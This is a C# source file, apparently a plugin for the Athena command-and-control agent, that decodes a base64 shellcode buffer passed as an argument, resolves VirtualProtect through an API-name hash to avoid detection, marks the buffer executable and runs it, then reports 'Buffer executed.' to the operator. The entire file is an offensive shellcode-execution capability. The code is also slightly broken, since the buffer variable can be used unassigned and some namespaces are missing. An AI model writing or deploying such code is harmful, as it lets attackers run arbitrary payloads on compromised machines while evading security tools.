using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using PluginBase;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        private delegate void BufferDelegate();
        private enum MemoryProtection : UInt32
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        const long VirtPro = 65467780416196;
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public override void Execute(Dictionary<string, object> args)
        {
            byte[] buffer;
            if (args.ContainsKey("buffer"))
            {
                buffer = Convert.FromBase64String(args["buffer"].ToString());
            }
            Task.Run(() =>
            {
                unsafe
                {
                    fixed (byte* ptr = buffer)
                    {
                        IntPtr pAddr = (IntPtr)ptr;
                        uint lpfOldProtect = 0;
                        IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro); //Get Pointer for VirtualProtect function
                        VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate)); //Create VirtualProtect Delegate
                        ptrVPD(pAddr, (UIntPtr)buffer.Length, 0x00000020, out lpfOldProtect); //Call Virtual Protect

                        BufferDelegate f = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(pAddr, typeof(BufferDelegate)); //Create delegate for our sc buffer

                        f(); //Execute buffer
                    }
                }
            });

            PluginHandler.AddResponse(new ResponseResult()
            {
                completed = "true",
                user_output = "Buffer executed.",
                task_id = (string)args["task-id"],
                status = "success"
            });
        }
    }
}